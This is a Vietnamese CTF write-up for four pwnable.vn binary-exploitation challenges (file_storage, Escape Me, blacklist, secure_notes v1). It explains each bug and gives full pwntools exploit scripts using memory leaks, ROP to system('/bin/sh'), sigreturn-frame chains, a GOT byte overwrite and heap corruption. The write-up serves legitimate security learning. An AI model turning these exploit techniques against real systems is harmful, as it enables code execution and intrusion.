## file_storage

Ở bài này, tác giả cho ta source code của file `file_storage.c`, tuy nhiên thì không có binary, do đó ta không biết được các compile flag (stack canary, PIE, ...) mà binary trên remote server sử dụng là gì. Sau khi audit một tí thì ta để ý thấy 2 bug:
- Một bug buffer overflow khá rõ ràng ở hàm `feedback`

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/05b0cac2-f645-4c58-b7eb-d7cabd1368b1)

- Một bug out-of-bound read xảy ra do ta có thể nhập số âm vào tham số `offset` khi thực hiện đọc file

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/70418781-daf2-46a3-8304-7a3c3e904c19)

Nếu độ dài của file nhỏ `4096` thì sẽ được lưu tạm ở .bss segment trong biến `fixed`, từ đó ta kết luận được trên remote thì binary sẽ được compile với Partial RELRO/No RELRO vì nếu không thì phần buffer này sẽ bị read-only. Nếu độ dài của file lớn hơn thì nó sẽ được allocate lên heap, lợi dụng điều này ta có thể thông qua heap để leak các pointer đến libc trên heap.

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/df60c7bc-72c5-4902-9dae-75736b00a6b5)

Để làm được như thế thì ta phải có một file có độ dài lớn, may mắn trên remote tác giả đã cho ta 2 file `4k` và `8k` chứa lần lượt 4000 và 8000 nullbyte

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/af5922a7-3f3a-474c-b0a6-bfc986c0b73f)

Hai địa chỉ mà ta leak được của libc lần lượt là của `_IO_2_1_stderr_` và `_IO_wfile_jumps`, ta sẽ tìm vài trang libc database để search offset và tìm xem libc version mà remote đang sử dụng là gì

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/9923a0cf-e891-42b8-b07c-52a86db3e0df)

Vậy là ta xác định được bài dùng glibc 2.31, giờ thì ta có thể dùng libc để ROP bằng bug buffer overflow ban đầu. Tuy nhiên để chắc chắn, ta cần xác định xem binary trên server có sử dụng stack canary hay không, ta có thể dùng bug out-of-bound read khi nãy để read từ .bss segment ngược về code segment, sau đó dùng capstone engine để check assembly và xem binary có gọi đến fs segment hay gọi đến `__stack_chk_fail` không

```python
from pwn import *
from pwn import u64, u32, p64, p32, unpack
import capstone

if args.REMOTE:
    io = remote("file_storage.pwnable.vn", 10000)
    libc = ELF("libc/libc-2.31.so", checksec=False)
    file = b"lorem"
    file_big = b"8k"
    bin_sh = 0x1b45bd
    pop_rdi = 0x23b6a
else:
    io = process("./a.out")
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
    file = b"a.txt"
    file_big = b"b.txt"
    bin_sh = 0x1d8678
    pop_rdi = 0x2a3e5

io.sendlineafter(b"> ", b"cat " + file_big + b" -4488 8")
leak = io.recvline()[0:6]
_IO_2_1_stderr_ = unpack(leak, word_size=8*6)

print("_IO_2_1_stderr_ @ " + hex(_IO_2_1_stderr_))

io.sendlineafter(b"> ", b"cat " + file_big + b" -4128 8")
leak = io.recvline()[0:6]
_IO_wfile_jumps = unpack(leak, word_size=8*6)

print("_IO_wfile_jumps @ " + hex(_IO_wfile_jumps))

libc.address = _IO_wfile_jumps - libc.sym["_IO_wfile_jumps"]
# canary_addr = libc.address-0x2898
sh = libc.address + bin_sh
print("libc @ " + hex(libc.address))
print("/bin/sh @ " + hex(sh))
print("system @ " + hex(libc.sym["system"]))

# ilen = canary_addr >> 8*3
# offset = ((ilen<<8*3) ^ canary_addr) 
pause()
io.sendlineafter(b"> ", b"cat " + file + b" -9728 4096")

sleep(2)
leak_binary = io.recv(4096)

md = capstone.Cs(capstone.CS_ARCH_X86, capstone.CS_MODE_64)
with open("bin", "wb") as f_bin:
    f_bin.write(leak_binary)

for i in md.disasm(leak_binary, 0x1000):
    print("0x%x:\t%s\t%s" %(i.address, i.mnemonic, i.op_str))
```

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/0392e061-ff02-49f9-8aa9-43c0eefc4f30)

Sau khi đọc qua, ta xác định là server không có canary, lúc này thì mạnh dạn ROP thôi

```py
from pwn import *
from pwn import u64, u32, p64, p32, unpack
import capstone

if args.REMOTE:
    io = remote("file_storage.pwnable.vn", 10000)
    libc = ELF("libc/libc-2.31.so", checksec=False)
    file = b"lorem"
    file_big = b"8k"
    bin_sh = 0x1b45bd
    pop_rdi = 0x23b6a
else:
    io = process("./a.out")
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
    file = b"a.txt"
    file_big = b"b.txt"
    bin_sh = 0x1d8678
    pop_rdi = 0x2a3e5

io.sendlineafter(b"> ", b"cat " + file_big + b" -4488 8")
leak = io.recvline()[0:6]
_IO_2_1_stderr_ = unpack(leak, word_size=8*6)

print("_IO_2_1_stderr_ @ " + hex(_IO_2_1_stderr_))

io.sendlineafter(b"> ", b"cat " + file_big + b" -4128 8")
leak = io.recvline()[0:6]
_IO_wfile_jumps = unpack(leak, word_size=8*6)

print("_IO_wfile_jumps @ " + hex(_IO_wfile_jumps))

libc.address = _IO_wfile_jumps - libc.sym["_IO_wfile_jumps"]
# canary_addr = libc.address-0x2898
sh = libc.address + bin_sh
print("libc @ " + hex(libc.address))
print("/bin/sh @ " + hex(sh))
print("system @ " + hex(libc.sym["system"]))

# ilen = canary_addr >> 8*3
# offset = ((ilen<<8*3) ^ canary_addr) 
pause()
io.sendlineafter(b"> ", b"cat " + file + b" -9728 4096")

sleep(2)
leak_binary = io.recv(4096)

md = capstone.Cs(capstone.CS_ARCH_X86, capstone.CS_MODE_64)
with open("bin", "wb") as f_bin:
    f_bin.write(leak_binary)

for i in md.disasm(leak_binary, 0x1000):
    print("0x%x:\t%s\t%s" %(i.address, i.mnemonic, i.op_str))


io.sendlineafter(b"> ", b"exit")
io.sendline(b"A"*264 + p64(libc.address + pop_rdi + 1) + p64(libc.address + pop_rdi) + p64(sh) + p64(libc.sym["system"]))

io.interactive()
```

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/f445a504-547a-4ee0-b645-d67a365bd3c4)

## Escape Me

Bài này thực hiện tạo một sandbox process bằng fork, sau đó sử dụng seccomp filter để ngăn ta sử dụng các syscall ngoại trừ `read`, `write`, `fstat`, `exit_group`, `mmap`, `munmap`, `mprotect` và cho ta chạy shellcode trên process đó. Ban đầu ta nghĩ đây là một bài syscall bypass, tuy nhiên nếu để ý kỹ thì có một bug buffer overflow xảy ra khi hàm `broker_process` nhận output được trả về từ shellcode của ta

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/713c4d82-23d6-42bd-9045-1a201578ba5b)

Challenge thực hiện `mmap` ra một vùng nhớ và gắn với để cho shellcode ghi output vào với 4 byte đầu sẽ là length của output và còn lại là data, ở đây ta có thể control `out_sz` tùy ý, từ đó dẫn tới stack-based buffer overflow. VÌ bài này cũng không cho ta biết libc, nên ta sẽ leak libc thông qua GOT, sau đó dùng cách tương tự bài `file_storage` để xác định libc và cuối cùng là trả về data để overflow biến `output` và thực hiện ROP để control RIP.

```python
from pwn import *
from pwn import u64, u32, p64, p32, unpack, asm

if args.REMOTE:
    io = remote("escape_me.pwnable.vn", 31338)
    pop_rdi = 0x2a3e5
    system = 0x50d60
    sh = 0x1d8698
    read_offset = 0x114980
else:
    io = process("./escape_me")
    pop_rdi = 0x2a3e5
    system = 0x50d70
    sh = 0x1d8678
    read_offset = 0x1147d0

shellcode = asm(f"""
    mov r11, 0x404080
    mov r11, [r11]
    sub r11, {read_offset}
    mov r15, r11
    mov rax, 0
    lea rsi, [rdi+4]
    mov r11, 1000
    mov [rdi], r11
    lea rbx, [rsi+rax*8]
    mov r13, 0x4141414141414141
    mov [rbx], r13
    add rax, 1
    cmp rax, 32
    jle $-25
    lea r11, [r15+{pop_rdi+1}]
    mov [rsi+33*8], r11
    lea r11, [r15+{pop_rdi}]
    mov [rsi+34*8], r11
    lea r11, [r15+{system}]
    mov [rsi+36*8], r11
    lea r11, [r15+{sh}]
    mov [rsi+35*8], r11
    ret
""", arch = 'amd64', os = 'linux')


pause()
io.sendlineafter(b">", b"1")
io.sendline(str(len(shellcode)).encode())
io.send(shellcode)

io.sendlineafter(b">", b"2")
io.interactive()
```

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/c874782d-499b-4c2a-b9a4-54bee824e3c7)

## blacklist

Đây là một bài syscall bypass, chặn các syscall `execve`, `execveat`, `write`, `pwritev`, `pwritev2`, `pwrite64`, `mprotect`, `kill`, `tkill`. Ta nhanh chóng nhận ra ta sẽ có đủ 3 syscall (`open`, `read`, `writev`) để read flag, giờ việc còn lại sẽ là tìm cơ hội để dùng 3 syscall này.

Bài này thì ta sẽ có một bug buffer overflow 48-32=16 byte overflow, vừa đủ để override return address và control được RIP, tuy nhiên có vài vấn đề:
- Không có memory leak
- Binary không có syscall instruction

Binary được compile với no pie, do đó việc đầu tiên ta nghĩ đến hẳn sẽ là tìm cách để stack pivot lên một vùng memory RW của binary, thường là `.bss`. Một cách mà ta có thể dùng là gadget `leave, ret`

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/2a45ba6a-0dba-4090-911c-13a6fbde4a40)

buffer bị overflow bắt đầu tại `a60`, sau lệnh leave của main thì RBP sẽ là giá trị tại `a80`, ta có thể đưa địa chỉ của .bss vào để pivot stack. Ở đây ta có thể control RIP về `0x401469`

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/5c12d8f1-b4f1-42d4-b33d-3e33ea918668)

Do ta đã control RBP, với gadget này ta sẽ thực hiện ghi 48 byte đến `RBP-0x20` trước rồi sau đó mới thực hiện leave để pivot lên .bss. Giờ đây ta cần giải quyết vấn đề tiếp theo, ta có thể ROP nhưng thiếu đi gadget `syscall`, sau khi kiểm tra các GOT entry thì mình phát hiện là nếu ta ghi đè 1 byte đầu của alarm@got thì ta sẽ có thể có được `syscall` instruction, tuy không biết libc nhưng việc bruteforce 0xff thì không khó. Sau khi có instruction `syscall` thì mình nghĩ đến dùng `read` để control rax và dùng sigreturn để để gọi đến lần lượt 3 syscall `open`, `read`, `writev`. Thông qua bruteforce thì mình biết được byte cần ghi để biến instruction tại alarm@got thành `syscall` là `\x0b`, cách mình bruteforce là mình sẽ canh để ghi ghi 1 byte vào alarm@got xong thì nó sẽ return về đúng địa chỉ đó luôn, vì `main+66` là lệnh `mov eax, 0` nên chắc chắn lúc đó rax sẽ là `0x0`.

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/4b9cdfa6-36c4-42cc-81ba-90ba0ea47036)

Nếu như alarm@got lúc này đúng là syscall thì nó sẽ gọi đến syscall `read` và bị delay, ngay sau alarm@got sẽ là read@got, do đó mà chương trình sẽ tiếp tục wait for input và bị delay thêm một lần thứ 2, đây sẽ là dấu hiệu để ta xác định được rằng byte ta ghi đã đúng chưa.

Sau khi có `syscall` rồi thì bây giờ ta chỉ cần setup 3 sigreturn frame và thực hiện sigreturn để control các register và gọi đến các syscall `open`, `read`, `writev` nữa là được

```py
from pwn import *
from pwn import u64, u32, p64, p32, unpack, asm

# PwnableVN{n0_m0r3_cSu__Wh!t3L!5T_Is_b3tT3r}

if args.REMOTE:
    io = remote("blacklist.pwnable.vn", 31337)

else:
    io = process("./sym")


exe = ELF("./sym")
main = 0x000000000040143d
ret = 0x401485


mis_aligned_read = 0x0000000000401469
pivot_bss_addr = 0x4040a8
pivot_2 = 0x404168+40
pivot_3 = 0x4042b8
pivot_4 = 0x404430
signal_got = 0x404058
alarm_got = 0x404028
leave_ret = 0x0000000000401484
ret = 0x0000000000401485
pop_rbp = 0x000000000040123d
jmp_rax = 0x40120e
sig_frame = 0x4041c0
sig_frame_2 = 0x4042b8+8+8*6
sig_frame_3 = 0x404430+8+8*6

SYS_open = p64(2)
SYS_read = p64(0)
SYS_writev = p64(20)
flag_str = p64(0x404020)
next_rip = p64(ret)
next_rbp = p64(0x404280) 
next_rsp = p64(0x404280) # straight to planned syscall
O_RDONLY = p64(0)
FLAGS = p64(0)

io.recvuntil(b"flag\n")
# io = process("./blacklist")
# write to signal got 
pause()
io.send(b"A"*32 + p64(pivot_bss_addr+0x20) + p64(mis_aligned_read))
io.send(b"F"*16 + flag_str + O_RDONLY + p64(signal_got+0x20) + p64(mis_aligned_read))

pause()
io.send(p64(pop_rbp) + p64(0x404040) + p64(leave_ret) + p64(sig_frame+4*8+0x18+0x20)*2 + p64(mis_aligned_read))
io.send(next_rbp + b"A"*8*3 + p64(signal_got+0x20) +  p64(mis_aligned_read))

# setup sigframe 1
pause()
io.send(p64(pop_rbp) + p64(0x404040) + p64(leave_ret) + p64(sig_frame+8+0x10+0x20)*2 + p64(mis_aligned_read))
io.send(b"F"*16 + flag_str + O_RDONLY + p64(signal_got+0x20) + p64(mis_aligned_read))

pause()
io.send(p64(pop_rbp) + p64(0x404040) + p64(leave_ret) + p64(sig_frame+8*4+0x18+0x10+0x20)*2 + p64(mis_aligned_read))
io.send(FLAGS + SYS_open + b"A"*8 + next_rsp + p64(signal_got+0x20) +  p64(mis_aligned_read))

pause()
io.send(p64(pop_rbp) + p64(0x404040) + p64(leave_ret) + p64(sig_frame+6*8+0x18+0x20+0x20)*2 + p64(mis_aligned_read))
io.send(next_rip + b"2"*8 + b"3"*16 + p64(signal_got+0x20) +  p64(mis_aligned_read))

pause()
io.send(p64(pop_rbp) + p64(0x404040) + p64(leave_ret) + p64(sig_frame+6*8+0x18+0x20+0x20+16)*2 + p64(mis_aligned_read))
io.send(p64(0x33) + b"4"*16 + p64(0x2b) + p64(signal_got+0x20) + p64(mis_aligned_read))

pause()
io.send(p64(pop_rbp) + p64(0x404040) + p64(leave_ret) + p64(sig_frame+6*8+0x18+0x20+0x20+40+8)*2 + p64(mis_aligned_read))
io.send(b"\x00"*8*4 + p64(signal_got+0x20) + p64(mis_aligned_read))

pause()
io.send(p64(pop_rbp) + p64(0x404040) + p64(leave_ret) + p64(sig_frame+6*8+0x18+0x20+0x20+40+8+40)*2 + p64(mis_aligned_read))
io.send(p64(exe.plt["alarm"]) + p64(pop_rbp) + p64(0x4042d8) + p64(mis_aligned_read) + p64(signal_got+0x20) + p64(mis_aligned_read))

# setup sigframe 2
fd = p64(3)
buf = p64(0x404020)
count = p64(8)

pause()
io.send(p64(pop_rbp) + p64(0x404040) + p64(leave_ret) + p64(sig_frame_2+8+0x10+0x20-8)*2 + p64(mis_aligned_read))
io.send(b"F"*16 + fd + buf + p64(signal_got+0x20) + p64(mis_aligned_read))

pause()
io.send(p64(pop_rbp) + p64(0x404040) + p64(leave_ret) + p64(sig_frame_2+8*4+0x18+0x10+0x20-8)*2 + p64(mis_aligned_read))
io.send(count + SYS_read + b"A"*8 + next_rsp + p64(signal_got+0x20) +  p64(mis_aligned_read))

pause()
io.send(p64(pop_rbp) + p64(0x404040) + p64(leave_ret) + p64(sig_frame_2+6*8+0x18+0x20+0x20-8)*2 + p64(mis_aligned_read))
io.send(next_rip + b"2"*8 + b"3"*16 + p64(signal_got+0x20) +  p64(mis_aligned_read))

pause()
io.send(p64(pop_rbp) + p64(0x404040) + p64(leave_ret) + p64(sig_frame_2+6*8+0x18+0x20+0x20+16-8)*2 + p64(mis_aligned_read))
io.send(p64(0x33) + b"4"*16 + p64(0x2b) + p64(signal_got+0x20) + p64(mis_aligned_read))

pause()
io.send(p64(pop_rbp) + p64(0x404040) + p64(leave_ret) + p64(sig_frame_2+6*8+0x18+0x20+0x20+40+8-8)*2 + p64(mis_aligned_read))
io.send(b"\x00"*8*4 + p64(signal_got+0x20) + p64(mis_aligned_read))

pause()
io.send(p64(pop_rbp) + p64(0x404040) + p64(leave_ret) + p64(sig_frame_2+6*8+0x18+0x20+0x20+40+8+40)*2 + p64(mis_aligned_read))
io.send(p64(exe.plt["alarm"]) + p64(pop_rbp) + p64(pivot_4+0x20) + p64(mis_aligned_read) + p64(signal_got+0x20) + p64(mis_aligned_read))

# setup sigframe 3
iovec = buf + count
io_vec_addr = p64(0x404478)
fd = p64(1) # stdout
vlen = p64(1) # vector count, we have 1

pause()
io.send(p64(pop_rbp) + p64(0x404040) + p64(leave_ret) + p64(sig_frame_3+8+0x10+0x20-8)*2 + p64(mis_aligned_read))
io.send(iovec + fd + io_vec_addr + p64(signal_got+0x20) + p64(mis_aligned_read))

pause()
io.send(p64(pop_rbp) + p64(0x404040) + p64(leave_ret) + p64(sig_frame_3+8*4+0x18+0x10+0x20-8)*2 + p64(mis_aligned_read))
io.send(vlen + SYS_writev + b"A"*8 + next_rsp + p64(signal_got+0x20) +  p64(mis_aligned_read))

pause()
io.send(p64(pop_rbp) + p64(0x404040) + p64(leave_ret) + p64(sig_frame_3+6*8+0x18+0x20+0x20-8)*2 + p64(mis_aligned_read))
io.send(next_rip + b"2"*8 + b"3"*16 + p64(signal_got+0x20) +  p64(mis_aligned_read))

pause()
io.send(p64(pop_rbp) + p64(0x404040) + p64(leave_ret) + p64(sig_frame_3+6*8+0x18+0x20+0x20+16-8)*2 + p64(mis_aligned_read))
io.send(p64(0x33) + b"4"*16 + p64(0x2b) + p64(signal_got+0x20) + p64(mis_aligned_read))

pause()
io.send(p64(pop_rbp) + p64(0x404040) + p64(leave_ret) + p64(sig_frame_3+6*8+0x18+0x20+0x20+40+8-8)*2 + p64(mis_aligned_read))
io.send(b"\x00"*8*4 + p64(signal_got+0x20) + p64(mis_aligned_read))

pause()
io.send(p64(pop_rbp) + p64(0x404040) + p64(leave_ret) + p64(sig_frame_3+6*8+0x18+0x20+0x20+40+8+40)*2 + p64(mis_aligned_read))
io.send(p64(exe.plt["alarm"]) + p64(pop_rbp) + p64(0x4042d8) + p64(mis_aligned_read) + p64(signal_got+0x20) + p64(mis_aligned_read))

# 1-byte overwrite
pause()
io.send(p64(pop_rbp) + p64(pivot_2) + p64(mis_aligned_read) + p64(alarm_got+0x20-8)*2 + p64(mis_aligned_read))
io.send(p64(0x4040a8+0x20)*5 + b"\x0b")

pause()
io.send(b"AAA")
pause()
io.send(b"/flag" + b"\x00"*10)


pause()
io.send(p64(exe.plt["read"]) + p64(exe.plt["alarm"]) + p64(mis_aligned_read) + b"A"*8 + p64(sig_frame) + p64(mis_aligned_read))

# trigger sigreturn
pause()
io.send(p64(exe.plt["read"]) + p64(exe.plt["alarm"]) + p64(mis_aligned_read) + b"A"*8 + p64(pivot_2-32-8) + p64(mis_aligned_read))
pause()
io.send(b"AAA")

pause()
io.send(b"/flag" + b"\x00"*10)

pause()
io.send(p64(exe.plt["read"]) + p64(exe.plt["alarm"]) + p64(mis_aligned_read) + b"A"*8 + p64(pivot_3) + p64(mis_aligned_read))

#trigger sigreturn
pause()
io.send(p64(exe.plt["read"]) + p64(exe.plt["alarm"]) + p64(mis_aligned_read) + b"A"*8 + p64(pivot_3-32-8) + p64(mis_aligned_read))
pause()
io.send(b"AAA")

pause()
io.send(b"/flag" + b"\x00"*10)

pause()
io.send(p64(exe.plt["read"]) + p64(exe.plt["alarm"]) + p64(mis_aligned_read) + b"A"*8 + p64(pivot_4) + p64(mis_aligned_read))

#trigger sigreturn
pause()
io.send(p64(exe.plt["read"]) + p64(exe.plt["alarm"]) + p64(mis_aligned_read) + b"A"*8 + p64(pivot_4-32-8) + p64(mis_aligned_read))
pause()
io.send(b"AAA")

pause()
io.send(b"/flag" + b"\x00"*10)

io.interactive()
```

Một cách khác đó là ta có thể dùng syscall `mmap` để tạo ra một vùng nhớ RWX, sau đó ghi shellcode vào và chạy. 

flag: `PwnableVN{n0_m0r3_cSu__Wh!t3L!5T_Is_b3tT3r}`

## secure_notes v1

Bài này là một bài quản lý các note, gồm backend và một interface được chạy ở 2 process riêng biệt, interface sẽ giao tiếp với backend thông qua các Inter-Process Call. Bài này gồm 2 phần, phần 1 sẽ là tìm cách để exploit process interface và cat flag1, phần 2 sẽ là exploit process backend.  

Ở phía interface, khi tạo một note thì note sẽ được lưu vào một doubly linked list, ta có thể lựa chọn để encrypt note này hoặc không, nếu encrypt thì note này sẽ tự động được sync với notes ở backend. Ta cũng có những chức năng khác như sync, delete, edit các notes. 

### Auditing

Sau một thời gian audit, ta nhận thấy có một bug trong quá trình sync note, ở interface, ta có thể tự do add nhiều note với title và author trùng nhau, nhưng ở backend nếu thực hiện add 1 note với title và author trùng với 1 note đã tồn tại thì nó sẽ thực hiện update note đó. Vậy thì với cơ chế này, ta có thể kiến cho list node ở interface và backend bị desync, tiếp đó ta có thể thực hiện sync note từ backend về interface

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/4fbcadf8-fdfd-46ac-9735-906a157852ca)

Ở đây interface thực hiện copy buffer từ note được gửi về từ server và size cũng được quyết định bởi note của server, do đó ta sẽ có một bug heap-based buffer overflow.

```python
from pwn import *
from pwn import unpack, p64, u64

if args.REMOTE:
    io = remote("secure_notes1.pwnable.vn", 31331)
else:
    # io = process(["./interface", "./backend"])
    # io = process(["./interface_orig_patched", "./backend_orig_patched"])
    io = remote("localhost", 8089)


libc = ELF("./libc.so.6.bak", checksec=False)
exe = ELF("./interface_orig", checksec=False)

def add_new_note(title, author, is_encrypted, passwd, content_length, content):
    io.sendlineafter(b"Choice: ", b"1")
    io.sendlineafter(b"Title: ", title)
    io.sendlineafter(b"Author: ", author)
    io.sendlineafter(b"Wanna encrypt this notes? (y/n) ", b"y" if is_encrypted else b"n")
    if is_encrypted:
        io.sendlineafter(b"What is your passwd? ", passwd)
    io.sendlineafter(b"How many bytes for content? ", str(content_length).encode())
    io.sendlineafter(b"Content:", content)

def note_sync(flag):
    io.sendlineafter(b"Choice: ", b"6")
    io.sendlineafter(b"You you want to [s]ync or [c]ommit note? (s/c)", b"c" if flag == 1 else b"s")

def delete_note(title, author, is_encrypted, password):
    io.sendlineafter(b"Choice: ", b"5")
    io.sendlineafter(b"Title: ", title)
    io.sendlineafter(b"Author: ", author)
    if is_encrypted:
        io.sendlineafter(b"Your password? ", password)

def read_note(title, author, is_encrypted, passwd):
    io.sendlineafter(b"Choice: ", b"3")
    io.sendlineafter(b"Title: ", title)
    io.sendlineafter(b"Author: ", author)
    if is_encrypted:
        io.sendlineafter(b"Password?", passwd)

def list_note():
    io.sendlineafter(b"Choice: ", b"2")

def edit_note(title, author, is_encrypted, passwd, content_len, content):
    io.sendlineafter(b"Choice: ", b"4")
    io.sendlineafter(b"Title: ", title)
    io.sendlineafter(b"Author: ", author)

    if is_encrypted:
        io.sendlineafter(b"Password ?", passwd)
    io.sendlineafter(b"New content len?", str(content_len).encode())
    io.sendlineafter(b"New content:", content)
    



add_new_note(b"shin24", b"shin24", False, None, 0, b"aaaaa")
add_new_note(b"shin24", b"shin24", True, b"123", 960, b"A"*(928))

edit_note(b"shin24", b"shin24", False, None, 40, b"aaaaaaa")

# old_size_payload = b"A"*(40-32) + p64(0x391)

# trigger heap overflow
note_sync(0)

read_note(b"shin24", b"shin24", False, None)

leak = io.recvline()
leak = unpack(leak[len(leak)-7:len(leak)-1], word_size=6*8)
heap_base = leak - 0xbec0

print("heap @ " + hex(heap_base))

libc_on_heap = heap_base+0x198f8

# restore old size so that `free` won't fail
# add_new_note(b"shin24", b"shin24", False, None, 960, b"A"*(928))

delete_note(b"shin24", b"shin24", False, None)


add_new_note(b"hacker", b"hacker", False, None, 1, b"bbbbb")
add_new_note(b"hacker", b"hacker", True, b"123", 452, b"A"*(248+76) + p64(0x91) + b"victim\x00\x00" + b"\x00"*56 + b"victim\x00\x00" + b"\x00"*24 + p64(0x14) + b"\x00"*8 + p64(libc_on_heap))


edit_note(b"hacker", b"hacker", False, None, 240, b"aaaaaaa")
add_new_note(b"victim", b"victim", False, None, 240, b"aaaaa")

note_sync(0)

read_note(b"victim", b"victim", False, None)

io.recvuntil(b"Content: ")

leak = unpack(io.recv(6), word_size=6*8)
libc_addr = leak-0x21b6a0

libc.address = libc_addr

print("libc @ " + hex(libc.address))

add_new_note(b"hacker2", b"hacker2", True, b"123", 452, b"A"*(248+76) + p64(0x91) + b"victim2\x00" + b"\x00"*56 + b"victim2\x00" + b"\x00"*24 + p64(0x14) + b"\x00"*8 + p64(libc.sym["environ"]))

note_sync(0)

read_note(b"victim2", b"victim2", False, None)

io.recvuntil(b"Content: ")
leak = unpack(io.recv(6), word_size=6*8)
stack_leak = leak

print("stack @ " + hex(stack_leak))

stack_note_main_ret = stack_leak - 0x338

victim2 = heap_base+0x48090

add_new_note(b"hacker2", b"hacker2", True, b"123", 452+16, b"A"*(248+76) + p64(0x91) + b"victim2\x00" + b"\x00"*56 + b"victim2\x00" + b"\x00"*24 + p64(0x14) + b"\x00"*8 + b"C"*8 + p64(victim2) + p64(victim2))
note_sync(0)

# clear all notes
delete_note(b"victim2", b"victim2", False, None)

add_new_note(b"lalala", b"lalala", False, None, 0x90-16, b"aaa")

pop_rdi = libc.address + 0x000000000002a3e5
ret = pop_rdi+1

sh = libc.address + 0x1d8678

new_gate = heap_base + 0x486d0
shin24 = heap_base + 0x48a60


add_new_note(b"/bin/sh", b"newgate", False, None, 1, b"aaaaa")
add_new_note(b"/bin/sh", b"newgate", True, b"123", 264+184+16, b"A"*(136+184-24-112) + p64(ret) + p64(pop_rdi) + p64(sh) + p64(libc.sym["system"]) + b"A"*(112-8) + p64(0x91) + b"/bin/sh\x00" + b"\x00"*56 + b"newgate\x00" + b"\x00"*24 + p64(0x7f) + p64(0) + p64(stack_note_main_ret) + p64(new_gate) + p64(new_gate))

edit_note(b"lalala", b"lalala", False, None, 20, b"aaaaaaa")
delete_note(b"lalala", b"lalala", False, None)

edit_note(b"/bin/sh", b"newgate", False, None, 0x90-16, b"aaaaaaa")

# cleanup old notes
add_new_note(b"hacker2", b"hacker2", True, b"123", 20, b"aaa")
delete_note(b"hacker2", b"hacker2", True, b"123")

add_new_note(b"victim2", b"victim2", True, b"123", 20, b"aaa")
delete_note(b"victim2", b"victim2", True, b"123")

note_sync(0)
# note_sync(0)

read_note(b"/bin/sh", b"newgate", False, None)

io.recvuntil(b"Content: ")
leak = unpack(io.recv(6), word_size=6*8)
pie = leak-0x3fc4

exe.address = pie
stack_note_main_ret = stack_leak - 0x338

print("PIE @ " + hex(pie))

pop_rdi = exe.address + 0x0000000000002852
pop_rsi = exe.address + 0x0000000000002a40
ret = exe.address + 0x2574


delete_note(b"/bin/sh", b"newgate", False, None)

add_new_note(b"lalala1", b"lalala1", False, None, 0x90-16, b"aaa")

add_new_note(b"newgate2", b"newgate2", False, None, 1, b"aaaaa")
add_new_note(b"newgate2", b"newgate2", True, b"123", 388+184, b"A"*4 + p64(ret)*47 + p64(pop_rdi) + p64(new_gate) + p64(pop_rsi) + p64(0) + p64(exe.sym["execv"]) + b"A"*8 + p64(0x91) + b"newgate2" + b"\x00"*56 + b"newgate2" + b"\x00"*24 + p64(0x7f) + p64(0) + p64(stack_note_main_ret) + p64(new_gate) + p64(shin24))

edit_note(b"lalala1", b"lalala1", False, None, 20, b"aaaaaaa")
delete_note(b"lalala1", b"lalala1", False, None)

edit_note(b"newgate2", b"newgate2", False, None, 0x90-16, b"aaaaaaa")

note_sync(0)

pause()
note_sync(0)

io.interactive()
```
